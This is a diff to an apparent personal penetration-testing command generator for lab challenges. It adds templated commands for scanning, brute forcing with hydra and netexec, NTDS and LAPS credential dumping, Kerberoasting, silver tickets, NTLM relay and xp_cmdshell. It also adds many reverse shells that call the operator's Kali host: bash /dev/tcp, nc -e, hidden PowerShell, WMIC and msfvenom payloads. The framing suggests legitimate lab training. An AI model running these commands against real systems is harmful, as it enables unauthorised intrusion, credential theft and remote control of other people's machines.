@@ -59,7 +59,7 @@
 
     .grid {
       display: grid;
-      grid-template-columns: repeat(5, minmax(160px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
       gap: 12px;
     }
 
@@ -96,9 +96,10 @@
     }
 
     textarea {
-      min-height: 150px;
+      min-height: calc(5 * 1.4em + 20px); /* ~5 rows: line-height * 5 + top/bottom padding + border */
       resize: vertical;
       font-family: Consolas, Monaco, monospace;
+      line-height: 1.4;
     }
 
     input,
@@ -137,22 +138,44 @@
 
     .row {
       display: grid;
-      grid-template-columns: repeat(4, minmax(160px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
       gap: 12px;
     }
 
     .selected-row {
       display: grid;
       grid-template-columns:
-        minmax(120px, 0.8fr)   /* Target */
-        minmax(130px, 0.9fr)   /* Hostname */
-        minmax(150px, 1fr)     /* User */
-        minmax(150px, 1fr)     /* Password */
-        minmax(170px, 1.15fr)  /* Hash */
-        minmax(90px, 0.6fr)    /* Service */
-        minmax(70px, 0.45fr)   /* Port */
-        minmax(170px, 1.15fr); /* Filename */
-      gap: 12px;
+        minmax(0, 0.85fr)  /* Target */
+        minmax(0, 0.8fr)   /* Hostname */
+        minmax(0, 0.9fr)   /* User */
+        minmax(0, 0.95fr)  /* Password */
+        minmax(0, 1.1fr)   /* Hash */
+        minmax(0, 0.58fr)  /* Service */
+        minmax(0, 0.42fr)  /* Port */
+        minmax(0, 1fr);    /* Filename */
+      gap: 6px;
+    }
+
+    .selected-row > div {
+      min-width: 0;
+    }
+
+    .selected-row label {
+      margin-bottom: 4px;
+      font-size: 0.82rem;
+    }
+
+    .selected-row input,
+    .selected-row select {
+      min-width: 0;
+      min-height: 34px;
+      padding: 6px;
+      font-size: 0.85rem;
+    }
+
+    .selected-row .combo button {
+      width: 30px;
+      min-height: 34px;
     }
 
     .sticky-selected {
@@ -236,6 +259,27 @@
     .combo-option:hover {
       background: var(--panel);
       color: var(--accent);
+    }
+
+    .section-option .combo {
+      width: auto;
+    }
+
+    .section-option .combo input[type="text"] {
+      width: 220px;
+    }
+
+    .section-option .combo button {
+      width: 32px;
+      min-height: 32px;
+    }
+
+    .section-option .combo-menu {
+      left: 0;
+      right: auto;
+      min-width: 100%;
+      width: max-content;
+      max-width: min(480px, 80vw);
     }
 
     .section-options {
@@ -434,25 +478,9 @@
       color: var(--accent);
     }
 
-    @media (max-width: 1200px) {
-      .grid {
-        grid-template-columns: repeat(3, minmax(160px, 1fr));
-      }
-
-      .selected-row {
-        grid-template-columns: repeat(3, minmax(160px, 1fr));
-      }
-    }
-
     @media (max-width: 850px) {
       body {
         padding: 16px 48px 16px 16px;
-      }
-
-      .grid,
-      .row,
-      .selected-row {
-        grid-template-columns: 1fr;
       }
 
       .sticky-selected {
@@ -460,20 +488,6 @@
         margin-right: -48px;
         padding-left: 16px;
         padding-right: 48px;
-      }
-
-      .command-line {
-        flex-direction: column;
-      }
-
-      .command-prefix {
-        width: auto;
-        min-width: 0;
-        padding-top: 0;
-      }
-
-      .command-line button {
-        width: fit-content;
       }
 
       .command-subsection {
@@ -524,9 +538,9 @@ offsec</textarea>
 
     <div class="card">
       <h3>Passwords</h3>
-      <textarea id="passwordsInput" spellcheck="false" placeholder="Password123!&#10;Spring2026!">lab
+      <textarea id="passwordsInput" spellcheck="false" placeholder="Password123!&#10;Spring2026!">admin
 password
-admin</textarea>
+lab</textarea>
     </div>
 
     <div class="card">
@@ -554,7 +568,7 @@ admin</textarea>
 
     <div>
       <label for="kaliIpInput">Kali IP / LHOST / SRC_IP</label>
-      <input id="kaliIpInput" value="192.168.45.219" spellcheck="false" />
+      <input id="kaliIpInput" value="192.168.45.000" spellcheck="false" />
     </div>
 
     <div>
@@ -598,14 +612,14 @@ admin</textarea>
 
       <div>
         <label for="portInput">Port</label>
-        <input id="portInput" value="21" spellcheck="false" />
+        <input id="portInput" value="8000" spellcheck="false" />
       </div>
 
       <div>
         <label for="filenameSelect">Filename</label>
         <div class="combo" id="filenameCombo">
-          <input id="filenameSelect" value="shell.exe" spellcheck="false" autocomplete="off" />
-          <button type="button" id="filenameDropdownButton" aria-label="Show filename options"></button>
+          <input id="filenameSelect" value="shell64.exe" spellcheck="false" autocomplete="off" />
+          <button type="button" id="filenameDropdownButton" class="combo-toggle" aria-label="Show filename options"></button>
           <div class="combo-menu" id="filenameMenu"></div>
         </div>
       </div>
@@ -640,25 +654,27 @@ admin</textarea>
      * Supported template variables:
      * {target}, {hostname}, {last}, {targetNet}, {allLastOctets}, {allChallengeDirs},
      * {user}, {password}, {hash}, {domain}, {domainShort}, {domainSid},
-     * {kaliIp}, {lport}, {service}, {port}, {filename}
+     * {kaliIp}, {lport}, {service}, {port}, {filename}, {ldapBaseDn}
      *
      * Section-specific options can be defined with an `options` list.
      * Supported option types: checkbox, select, and text.
      **************************************************************************/
 
-    const SERVICES = ["SMB", "LDAP", "MSSQL", "WinRM", "WMI", "RDP", "SSH", "FTP"];
+    const SERVICES = ["FTP", "LDAP", "MSSQL", "RDP", "SMB", "SSH", "WinRM", "WMI"];
 
     const FILENAME_OPTIONS = [
-      "shell.exe",
+      "nc.exe",
+      "shell32.exe",
+      "shell64.exe",
       "ligolo-agent.exe",
       "winPEASx64.exe",
       "linpeas.sh",
-      "SharpHound.ps1",
-      "PrintSpoofer64.exe",
-      "nc.exe",
+      "PowerUp.ps1",
       "mimikatz.exe",
-      "mimikatz.log",
-      "SharpEfsPotato.exe"
+      "SharpHound.exe",
+      "Rubeus.exe",
+      "SharpEfsPotato.exe",
+      "PrintSpoofer64.exe"
     ];
 
     const COMMAND_SECTIONS = [
@@ -676,9 +692,13 @@ admin</textarea>
         nav: "Nmap",
         group: "Enumeration",
         commands: [
-          { prefix: "Most common 1000 ports", template: "sudo nmap -v -sV -sC -Pn -oA challenge/{last}/{last} {target}" },
-          { prefix: "All ports", template: "sudo nmap -v -sV -sC -Pn -oA challenge/{last}/{last}_all {target} -p- -T4" },
-          { prefix: "161 SNMP", template: "sudo nmap -sU -oA challenge/{last}/{last}_UDP {target}" }
+          { prefix: "Top 1000 ports", template: "sudo nmap -v -Pn -sV -sC -oN challenge/{last}/{last} {target}" },
+          { prefix: "TCP ports discovery", template: "sudo nmap -v -Pn -p- -T4 -oG challenge/{last}/{last}_allports {target}" },
+          { prefix: "Get open ports", template: "ports=$(grep -oP '\\d+(?=/open)' challenge/{last}/{last}_allports | sort -nu | paste -sd,)" },
+          { prefix: "Service scan", template: "sudo nmap -v -Pn -sV -sC -p$ports -oN challenge/{last}/{last}_services {target}" },
+          { prefix: "Vuln scan", template: "sudo nmap -v -Pn -sV -sC --script vuln -p$ports -oN challenge/{last}/{last}_vuln {target}" },
+          { prefix: "161 SNMP", template: "sudo nmap -v -Pn -sV -sC -sU --top-ports 100 -T4 -oN challenge/{last}/{last}_UDP {target}" },
+          //{ prefix: "All ports", template: "sudo nmap -v -Pn -sV -sC -p- -T4 -oN challenge/{last}/{last}_all {target}" }
         ]
       },
       {
@@ -688,12 +708,18 @@ admin</textarea>
         group: "Enumeration",
         options: [
           { id: "gobusterPath", type: "text", label: "URL path / output suffix", placeholder: "api" },
-          { id: "gobusterWordlist", type: "text", label: "Wordlist", defaultValue: "/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt" },
+          { id: "gobusterWordlist", type: "combo", label: "Wordlist", defaultValue: "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt", choices: [
+            { value: "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt" },
+            { value: "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt" }
+          ] },
           { id: "gobusterPort", type: "checkbox", label: "Add :{port}" },
-          { id: "gobusterProxy", type: "checkbox", label: "Add --proxy socks5://127.0.0.1:9999" }
+          { id: "gobusterProxy", type: "checkbox", label: "Add --proxy socks5://127.0.0.1:9999" },
+          { id: "gobusterExcludeLength", type: "checkbox", label: "Add --exclude-length" },
+          { id: "gobusterExcludeLengthValue", type: "text", label: "Exclude length", placeholder: "290" },
+          { id: "gobusterTls", type: "checkbox", label: "Add -k (skip TLS cert verification)" }
         ],
         commands: [
-          { template: "gobuster dir -u http://{target}{gobusterPortFlag}{gobusterPathFlag} -w {gobusterWordlist} -o challenge/{last}/gobuster{gobusterOutputSuffix} -x txt,conf -b 400,403,404{gobusterProxyFlag}" }
+          { template: "gobuster dir -u {gobusterProtocol}://{target}{gobusterPortFlag}{gobusterPathFlag} -w {gobusterWordlist} -o challenge/{last}/gobuster{gobusterOutputSuffix} -x txt,md,js,html,php,aspx,asp,jsp,conf -b 400,404{gobusterProxyFlag}{gobusterExcludeLengthFlag}{gobusterTlsFlag}" }
         ]
       },
       {
@@ -710,6 +736,33 @@ admin</textarea>
         ]
       },
       {
+        id: "dns",
+        title: "DNS",
+        nav: "DNS",
+        group: "Enumeration",
+        commands: [
+          { prefix: "DNS zone transfer", template: "dig {target} AXFR {domain}" }
+        ]
+      },
+      {
+        id: "enum4linux",
+        title: "Enum4linux",
+        nav: "Enum4linux",
+        group: "Enumeration",
+        commands: [
+          { prefix: "Enumerate Windows", template: "enum4linux-ng -A {target}" }
+        ]
+      },
+      {
+        id: "hostNameMapping",
+        title: "Host Name Mapping",
+        nav: "Host Name Mapping",
+        group: "Enumeration",
+        commands: [
+          { prefix: "Enumerate Windows", template: "echo \"{target} {domain} {hostname}.{domain}\" | sudo tee -a /etc/hosts" }
+        ]
+      },
+      {
         id: "Hydra",
         title: "Hydra (SSH, RDP, FTP)",
         nav: "Hydra",
@@ -721,7 +774,8 @@ admin</textarea>
           { template: "hydra -t 1{hydraPortFlag} -L users.txt -P passwords.txt {service}://{target}" },
           { template: "hydra -t 1{hydraPortFlag} -L users.txt -p '{password}' {service}://{target}" },
           { template: "hydra -t 1{hydraPortFlag} -l '{user}' -P passwords.txt {service}://{target}" },
-          { template: "hydra -t 1{hydraPortFlag} -l '{user}' -p '{password}' {service}://{target}" }
+          { template: "hydra -t 1{hydraPortFlag} -l '{user}' -p '{password}' {service}://{target}" },
+          { prefix: "Try default creds", template: "hydra -t 1{hydraPortFlag} -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Usernames/top-usernames-shortlist.txt {service}://{target}" }
         ]
       },
       {
@@ -736,14 +790,23 @@ admin</textarea>
           ] },
           { id: "nxcPort", type: "checkbox", label: "Add --port {port}" },
           { id: "nxcLocalAuth", type: "checkbox", label: "Add --local-auth" },
-          { id: "nxcCommandExec", type: "checkbox", label: "Add -X 'powershell -e '" }
+          { id: "nxcCommandExec", type: "checkbox", label: "Add -X 'powershell -e '" },
+          { id: "nobruteforce", type: "checkbox", label: "Add --no-bruteforce" },
+          { id: "nxcUsers", type: "checkbox", label: "Add --users" },
+          { id: "nxcGroups", type: "checkbox", label: "Add --groups" },
+          { id: "nxcComputers", type: "checkbox", label: "Add --computers" },
+          { id: "nxcShares", type: "checkbox", label: "Add --shares" },
+          { id: "nxcLoggedOnUsers", type: "checkbox", label: "Add --loggedon-users" },
+          { id: "nxcPassPol", type: "checkbox", label: "Add --pass-pol" }
         ],
         commands: [
-          { template: "nxc {service} {target}{nxcPortFlag} -u users.txt{nxcCredFileFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
-          { template: "nxc {service} {target}{nxcPortFlag} -u users.txt{nxcCredSingleFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
-          { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredFileFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
-          { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredSingleFlag}{nxcLocalAuthFlag}{nxcCommandExecFlag} --continue-on-success" },
-          { prefix: "SSH key file", template: "nxc ssh {target}{nxcPortFlag} -u users.txt --key-file id_ecdsa -p '{password}'{nxcLocalAuthFlag}" }
+          { prefix: "Anonymous enumeration", template: "netexec smb {target}{nxcFlags}" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u users.txt{nxcCredFileFlag}{nxcFlags} --continue-on-success" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u users.txt{nxcCredSingleFlag}{nxcFlags} --continue-on-success" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredFileFlag}{nxcFlags} --continue-on-success" },
+          { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredSingleFlag}{nxcFlags}{nxcCommandExecFlag}" },
+          { prefix: "SSH key file", template: "nxc ssh {target}{nxcPortFlag} -u users.txt --key-file id_ecdsa -p '{password}'{nxcFlags}{nxcCommandExecFlag}" },
+          { prefix: "Try default creds", template: "nxc {service} {target}{nxcPortFlag} -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/seclists/Usernames/top-usernames-shortlist.txt{nxcFlags} --continue-on-success" }
         ]
       },
       {
@@ -778,45 +841,30 @@ admin</textarea>
         ]
       },
       {
-        id: "SSH",
-        title: "SSH",
-        nav: "SSH",
-        group: "Protocols",
-        commands: [
-          { template: "ssh {user}@{target}" },
-          { template: "ssh -i id_ecdsa -p {port} {user}@{target}" }
-        ]
-      },
-      {
         id: "FTP",
         title: "FTP",
         nav: "FTP",
         group: "Protocols",
+        options: [
+          { id: "ftpTls", type: "checkbox", label: "Add -e 'set ssl:verify-certificate no' (skip TLS verify)" }
+        ],
         commands: [
           { prefix: "Connect to server", template: "ftp {target} {port}" },
-          { prefix: "Credential login", template: "lftp -u '{user}','{password}' ftp://{target}:{port}" },
-          { prefix: "Anonymous login", template: "lftp -u anonymous,anonymous ftp://{target}:{port}" }
+          { prefix: "Credential login", template: "lftp{ftpTlsFlag} -u '{user}','{password}' ftp://{target}:{port}" },
+          { prefix: "Anonymous login", template: "lftp{ftpTlsFlag} -u anonymous,anonymous ftp://{target}:{port}" },
+          { prefix: "Copy folder in lftp", template: "mirror --verbose /remote/folder /local/folder" },
+          { prefix: "Create local directory", template: "mkdir -p challenge/{last}/ftp" },
+          { prefix: "Download everything in ftp", template: "wget -r -nH -P challenge/{last}/ftp ftp://{user}:{password}@{target}:{port}" }
         ]
       },
       {
-        id: "Smbclient",
-        title: "Smbclient",
-        nav: "Smbclient",
+        id: "ldap",
+        title: "LDAP",
+        nav: "LDAP",
         group: "Protocols",
-        options: [
-          { id: "smbNullAuth", type: "checkbox", label: "Null authentication", defaultChecked: true },
-          { id: "smbUseDomain", type: "checkbox", label: "Include domain", defaultChecked: true },
-          { id: "smbShare", type: "select", label: "Share", choices: [
-            { value: "ADMIN$", label: "ADMIN$" },
-            { value: "C$", label: "C$" },
-            { value: "SYSVOL", label: "SYSVOL" }
-          ] }
-        ],
         commands: [
-          { prefix: "List SMB shares", template: "smbclient -L //{target} {smbAuthOption}" },
-          { prefix: "Connect to shares", template: "smbclient //{target}/{smbShare} {smbAuthOption}" },
-          { prefix: "Execute command", template: "smbclient //{target}/{smbShare} {smbAuthOption} -c '<command>'" },
-          { prefix: "Mount share", template: "sudo mount -t cifs //{target}/{smbShare} /home/kali/challenge/mount -o username={user},password='{password}',domain={domainShort},uid=$(id -u),gid=$(id -g),file_mode=0644,dir_mode=0755" }
+          { prefix: "Anonymous search", template: "ldapsearch -H ldap://{target}/ -x -b \"{ldapBaseDn}\" \"(objectClass=*)\"" },
+          { prefix: "Dump LAPS passwords", template: "nxc ldap {target} -u '{user}' -p '{password}' -M laps" }
         ]
       },
       {
@@ -849,6 +897,64 @@ admin</textarea>
         ]
       },
       {
+        id: "SMB",
+        title: "SMB",
+        nav: "SMB",
+        group: "Protocols",
+        options: [
+          { id: "smbNullAuth", type: "checkbox", label: "Null authentication", defaultChecked: true },
+          { id: "smbUseDomain", type: "checkbox", label: "Include domain", defaultChecked: true },
+          { id: "smbShare", type: "combo", label: "Share", placeholder: "SYSVOL", defaultValue: "SYSVOL", choices: [
+            { value: "ADMIN$" },
+            { value: "C$" },
+            { value: "SYSVOL" }
+          ] }
+        ],
+        commands: [
+          { prefix: "List SMB shares", template: "smbclient -L //{target} {smbAuthOption}" },
+          { prefix: "Connect to shares", template: "smbclient //{target}/{smbShare} {smbAuthOption}" },
+          { prefix: "Execute command", template: "smbclient //{target}/{smbShare} {smbAuthOption} -c '<command>'" },
+          { prefix: "Mount share", template: "sudo mount -t cifs //{target}/{smbShare} /home/kali/challenge/mount -o {smbMountAuthOption}uid=$(id -u),gid=$(id -g),file_mode=0644,dir_mode=0755" }
+        ]
+      },
+      {
+        id: "SNMP",
+        title: "SNMP",
+        nav: "SNMP",
+        group: "Protocols",
+        commands: [
+          { prefix: "v2c", template: "snmpwalk -v2c -c public -On {target} .1 | tee snmp2.txt" },
+          { prefix: "v1", template: "snmpwalk -v1 -c public -On {target} .1 | tee snmp1.txt   " }
+        ]
+      },
+      {
+        id: "SQL",
+        title: "SQL",
+        nav: "SQL",
+        group: "Protocols",
+        options: [
+          { id: "sqlAnonymous", type: "checkbox", label: "Anonymous / no credentials", defaultChecked: true }
+        ],
+        commands: [
+          { prefix: "MySQL", template: "mysql -h {target} -P 3306 {sqlMysqlAuth}" },
+          { prefix: "MSSQL - UDP port is 1434", template: "sqsh -S {target}:1433{sqlMssqlCliAuth}" },
+          { prefix: "", template: "impacket-mssqlclient -port 1433 {sqlMssqlTarget} -windows-auth" },
+          { prefix: "Enable xp_cmdshell on MSSQL", template: "enable_xp_cmdshell; RECONFIGURE; xp_cmdshell powershell -nop -enc JABjAG..." },
+          { prefix: "PostgreSQL", template: "{sqlPostgresPasswordPrefix}psql -h {target} -p 5432{sqlPostgresAuth}" }
+        ]
+      },
+      {
+        id: "SSH",
+        title: "SSH",
+        nav: "SSH",
+        group: "Protocols",
+        commands: [
+          { template: "ssh {user}@{target}" },
+          { template: "ssh -i id_ecdsa -p {port} {user}@{target}" },
+          { prefix: "SSH config", template: "cat /etc/ssh/sshd_config" }
+        ]
+      },
+      {
         id: "winrm",
         title: "WinRM (5985 & 5986)",
         nav: "WinRM",
@@ -869,19 +975,14 @@ admin</textarea>
         ]
       },
       {
-        id: "sql",
-        title: "SQL",
-        nav: "SQL",
-        group: "Protocols",
-        options: [
-          { id: "sqlAnonymous", type: "checkbox", label: "Anonymous / no credentials", defaultChecked: true }
-        ],
+        id: "PowerUp",
+        title: "PowerUp",
+        nav: "PowerUp",
+        group: "Privilege escalation",
         commands: [
-          { prefix: "MySQL", template: "mysql -h {target} -P 3306 {sqlMysqlAuth}" },
-          { prefix: "MSSQL - UDP port is 1434", template: "sqsh -S {target}:1433{sqlMssqlCliAuth}" },
-          { prefix: "", template: "impacket-mssqlclient -port 1433 {sqlMssqlTarget}" },
-          { prefix: "Enable xp_cmdshell on MSSQL", template: "enable_xp_cmdshell; RECONFIGURE; xp_cmdshell powershell -nop -enc JABjAG..." },
-          { prefix: "PostgreSQL", template: "{sqlPostgresPasswordPrefix}psql -h {target} -p 5432{sqlPostgresAuth}" }
+          { prefix: "", template: "powershell -ep bypass" },
+          { prefix: "Check for service binary hijacking", template: ". .\\PowerUp.ps1; Invoke-AllChecks" },
+          { prefix: "Reboot", template: "shutdown /r /t 0" }
         ]
       },
       {
@@ -890,18 +991,26 @@ admin</textarea>
         nav: "WinPEAS",
         group: "Privilege escalation",
         commands: [
-          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: ".\\winPEASx64.exe | Tee-Object winpeas.txt" },
+          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: ".\\winPEASx64.exe 2>&1 | Tee-Object winpeas.txt" },
           { prefix: "Convert to grep", template: "iconv -f UTF-16LE -t UTF-8 winpeas.txt > winpeas-utf8.txt" },
           { prefix: "Convert to mousepad", template: "sed -r 's/\\x1b\\[[0-9;]*m//g' winpeas-utf8.txt > wp-clean.txt" }
         ]
       },
       {
-        id: "LinPEAS",
-        title: "LinPEAS",
-        nav: "LinPEAS",
+        id: "Linux",
+        title: "Linux",
+        nav: "Linux",
         group: "Privilege escalation",
         commands: [
-          { prefix: "Look at env, autorun, scheduled tasks, listening ports", template: "./linpeas.sh 2>&1 | tee linpeas.txt" }
+          { prefix: "LinPEAS (env, autorun, cron, SUID, listening ports, files with capabilities)", template: "./linpeas.sh -s 2>&1 | tee linpeas.txt" },
+          { prefix: "sudo commmands", template: "sudo -l" },
+          { prefix: "Group memberships", template: "id" },
+          { prefix: "SUID", template: "find / -perm -4000 -type f 2>/dev/null" },
+          { prefix: "Scheduled cron jobs", template: "cat /etc/crontab" },
+          { prefix: "Capabilities (cap_setuid, cap_setgid, cap_dac_override, cap_sys_admin, cap_sys_ptrace)", template: "getcap -r / 2>/dev/null" },
+          { prefix: "Linux exploit", template: "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" },
+          { prefix: "", template: "chmod +x linux-exploit-suggester.sh" },
+          { prefix: "", template: "./linux-exploit-suggester.sh" },
         ]
       },
       {
@@ -910,7 +1019,7 @@ admin</textarea>
         nav: "SeImpersonatePrivilege",
         group: "Privilege escalation",
         commands: [
-          { prefix: "PrintSpoofer64", template: ".\\PrintSpoofer64.exe -i -c cmd" },
+          { prefix: "PrintSpoofer64", template: ".\\PrintSpoofer64.exe -c {filename}" },
           { prefix: "Potato", template: ".\\SharpEfsPotato.exe -p {filename}" }
         ]
       },
@@ -933,6 +1042,7 @@ admin</textarea>
           { template: "hostname" },
           { template: "systeminfo" },
           { template: "whoami /all" },
+          { prefix: "fix PATH environment variable", template: "set PATH=%SystemRoot%\\System32;%SystemRoot%;%PATH%" },
           { prefix: "Environment variables", template: "set" },
           { prefix: "Listening ports", template: "netstat -ano" },
           { prefix: "List local users", template: "net user" },
@@ -975,7 +1085,7 @@ admin</textarea>
           { prefix: "", className: "kali", template: "ifconfig" },
           { prefix: "", className: "kali", template: "sudo ip route add {targetNet} dev ligolo" },
           { prefix: "", className: "kali", template: "start" },
-          { prefix: "Create listener", className: "kali", template: "listener_add --addr 0.0.0.0:{port} --to 127.0.0.1:{port} --tcp" },
+          { prefix: "Create listener (1 agent port per rev shell)", className: "kali", template: "listener_add --addr 0.0.0.0:{port} --to 127.0.0.1:{port} --tcp" },
           { prefix: "List listener", className: "kali", template: "listener_list" },
           { prefix: "Set up routing to localhost on agent", className: "kali", template: "sudo ip route add 240.0.0.1/32 dev ligolo" }
         ]
@@ -988,20 +1098,22 @@ admin</textarea>
           { id: "impacketAuthMode", type: "select", label: "Auth", choices: [
             { value: "password", label: "Password" },
             { value: "hash", label: "Hash" }
-          ] }
+          ] },
+          { id: "impacketUseTicket", type: "checkbox", label: "Use exported Kerberos ticket" }
         ],
         commands: [
-          { prefix: "Local admin & ADMIN$", template: "impacket-psexec{impacketHashFlag} {domainShort}/{user}{impacketPwFlag}@{target}" },
-          { prefix: "", template: "impacket-wmiexec{impacketHashFlag} {domainShort}/{user}{impacketPwFlag}@{target}" },
-          { prefix: "Dump NTDS", template: "impacket-secretsdump -just-dc{impacketHashFlag} {domain}/{user}{impacketPwFlag}@{target}" },
-          { prefix: "Dump everything", template: "impacket-secretsdump{impacketHashFlag} {domain}/{user}{impacketPwFlag}@{target}" },
+          { prefix: "Sync time with DC", template: "sudo ntpdate {target}" },
+          { prefix: "Local admin & ADMIN$", template: "impacket-psexec{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
+          { prefix: "", template: "impacket-wmiexec{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
+          { prefix: "Dump NTDS", template: "impacket-secretsdump -just-dc{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
+          { prefix: "Dump everything", template: "impacket-secretsdump{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
           { prefix: "SMB NTLM relay", template: "impacket-ntlmrelayx --no-http-server -smb2support -t {target} -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"" },
-          { prefix: "AS-REP Roast", template: "impacket-GetNPUsers{impacketHashFlag} -dc-ip {target} -request -outputfile hashes.asreproast {domain}/{user}{impacketPwFlag}" },
+          { prefix: "AS-REP Roast", template: "impacket-GetNPUsers{impacketDirectoryAuthFlag} -dc-ip {target} -request -outputfile hashes.asreproast {impacketDirectoryTarget}" },
           { prefix: "", template: "impacket-GetNPUsers -dc-ip {target} {domain}/ -usersfile users.txt" },
-          { prefix: "Kerberoast", template: "impacket-GetUserSPNs{impacketHashFlag} -dc-ip {target} -request -outputfile hashes.kerberoast {domain}/{user}{impacketPwFlag}" },
+          { prefix: "Kerberoast", template: "impacket-GetUserSPNs{impacketDirectoryAuthFlag} -dc-ip {target} -request -outputfile hashes.kerberoast {impacketDirectoryTarget}" },
           { prefix: "Dump local SAM hashes", template: "impacket-secretsdump -sam SAM -system SYSTEM local" },
           { prefix: "Silver ticket", template: "impacket-ticketer -nthash {hash} -domain-sid {domainSid} -domain {domain} -spn {user}/{hostname}.{domain} -user-id 500 Administrator" },
-          { prefix: "Microsoft SQL (MSSQL) servers", template: "impacket-mssqlclient {hostname}.{domain} -k" }
+          { prefix: "Microsoft SQL (MSSQL) servers", template: "impacket-mssqlclient{impacketRemoteAuthFlag} {impacketRemoteTarget}" }
         ]
       },
       {
@@ -1037,11 +1149,12 @@ admin</textarea>
       },
       {
         id: "transfer-to-kali",
-        title: "Transfer files to Kali",
-        nav: "Transfer files to Kali",
+        title: "Transfer to Kali",
+        nav: "Transfer to Kali",
         commands: [
-          { prefix: "On Kali", className: "kali", template: "impacket-smbserver share . -smb2support" },
-          { prefix: "On Windows target", className: "target", template: "copy {filename} \\\\{kaliIp}\\share\\" },
+          { prefix: "On Kali", className: "kali", template: "sudo impacket-smbserver share \"$(pwd)\" -smb2support -username kali -password 'KaliPass123!'" },
+          { prefix: "On Windows target", className: "target", template: "cmd /c \"net use \\\\{kaliIp}\\share /user:kali KaliPass123! 2>&1\"" },
+          { prefix: "", className: "target", template: "cmd /c \"copy /Y {filename} \\\\{kaliIp}\\share\\ 2>&1\"" },
           { prefix: "On Linux target", className: "target", template: "smbclient //{kaliIp}/share -U kali" },
           { prefix: "", template: "put {filename}" },
           { prefix: "On Kali", className: "kali", template: "nc -lvnp 9001 > {filename}" },
@@ -1050,36 +1163,79 @@ admin</textarea>
           { prefix: "On Kali", className: "kali", template: "python3 -m uploadserver 8000" },
           { prefix: "On target", className: "target", template: "curl.exe -F \"files=@{filename}\" http://{target}:{port}/upload" },
           { prefix: "On Linux target", className: "target", template: "python -m http.server 80" },
-          { prefix: "WinRM", template: "upload {filename}" }
+          { prefix: "WinRM", template: "download {filename}" }
         ]
       },
       {
-        id: "download-from-kali",
-        title: "Downloading files from Kali",
-        nav: "Downloading files",
+        id: "transfer-to-target",
+        title: "Transfer to target",
+        nav: "Transfer to target",
         options: [
           { id: "downloadPort", type: "checkbox", label: "Add :{port}" }
         ],
         commands: [
+          { prefix: "Make executable", template: "chmod 777 {filename}" },
           { prefix: "Linux", template: "wget http://{kaliIp}{downloadPortFlag}/{filename}" },
           { prefix: "Linux/PowerShell", template: "curl http://{kaliIp}{downloadPortFlag}/{filename} -o {filename}" },
           { prefix: "PowerShell", template: "iwr -uri http://{kaliIp}{downloadPortFlag}/{filename} -OutFile {filename}" },
           { prefix: "CMD", template: "certutil -urlcache -split -f http://{kaliIp}{downloadPortFlag}/{filename} {filename}" },
-          { prefix: "WinRM", template: "download {filename}" }
+          { prefix: "WinRM", template: "upload {filename}" }
         ]
       },
       {
         id: "msfvenom",
         title: "msfvenom",
         nav: "msfvenom",
-        options: [
-          { id: "msfvenomFileType", type: "select", label: "File type", choices: [
-            { value: "exe", label: "exe" },
-            { value: "dll", label: "dll" }
-          ] }
-        ],
+        group: "Reverse shell",
         commands: [
-          { template: "msfvenom -p windows/x64/shell_reverse_tcp LPORT={lport} LHOST={kaliIp} -f {msfvenomFileType} -o shell.{msfvenomFileType}" }
+          { prefix: "Check target architecture", template: "uname -m" },
+          { prefix: "Linux x64 (x86_64 or amd64)", template: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={kaliIp} LPORT={port} -f elf -o shell64" },
+          { prefix: "Linux x86 (i686 or i386)", template: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={kaliIp} LPORT={port} -f elf -o shell32" },
+          { prefix: "Windows x64", template: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={kaliIp} LPORT={port} -f exe -o shell64.exe" },
+          { prefix: "Windows x86", template: "msfvenom -p windows/shell_reverse_tcp LHOST={kaliIp} LPORT={port} -f exe -o shell32.exe" }
+        ]
+      },
+      {
+        id: "Windows",
+        title: "Windows (new shell process)",
+        nav: "Windows",
+        group: "Reverse shell",
+        commands: [
+          { prefix: "cmd - Netcat", template: "start \"\" cmd.exe /c nc.exe {kaliIp} {port} -e cmd.exe" },
+          { prefix: "{cmd - PowerShell}", template: "start \"\" powershell.exe -WindowStyle Hidden -Command \"<reverse shell>\"" },
+          { prefix: "PowerShell", template: "Start-Process powershell.exe -ArgumentList \"-WindowStyle Hidden -Command powershell -nop -enc JABjAG...ACkA\"" },
+          { prefix: "WMIC", template: "wmic process call create \"cmd.exe /c C:\\Temp\\nc.exe {kaliIp} {port} -e cmd.exe\"" }
+        ]
+      },
+      {
+        id: "linux-shell",
+        title: "Linux",
+        nav: "Linux",
+        group: "Reverse shell",
+        commands: [
+          { prefix: "Netcat", template: "nc {kaliIp} {port} -e /bin/sh" },
+          { prefix: "Bash", template: "bash -i >& /dev/tcp/{kaliIp}/{port} 0>&1" },
+          { prefix: "Backgrounds the job", template: "bash -c 'bash -i >& /dev/tcp/{kaliIp}/{port} 0>&1' &" },
+          { prefix: "Fully decoupled from parent's session", template: "setsid bash -c 'bash -i >& /dev/tcp/{kaliIp}/{port} 0>&1' < /dev/null > /dev/null 2>&1 &" },
